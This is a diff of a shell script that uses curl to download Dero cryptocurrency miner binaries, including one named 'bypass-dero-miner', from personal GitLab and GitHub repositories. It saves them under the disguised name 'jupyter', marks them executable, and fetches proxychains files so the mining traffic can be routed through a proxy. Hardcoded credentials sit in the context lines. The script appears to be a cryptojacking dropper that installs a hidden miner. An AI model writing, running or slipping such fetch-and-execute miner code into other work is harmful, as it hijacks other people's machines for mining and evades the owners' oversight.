@@ -4,10 +4,10 @@ user="ingfo"
 pass="maseh"
 curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
 curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
-curl -L -o  proxy https://gitlab.com/alekpoden82/binamas/-/raw/main/panel && chmod +x proxy
-curl -L -o  https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
-curl -L -o  https://gitlab.com/alekpoden82/binamas/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so
-curl -L -o  https://gitlab.com/alekpoden82/binamas/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
+curl -L -o proxy https://gitlab.com/alekpoden82/binamas/-/raw/main/panel && chmod +x proxy
+curl -L https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
+curl -L https://gitlab.com/alekpoden82/binamas/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so
+curl -L https://gitlab.com/alekpoden82/binamas/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
 sleep 1 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
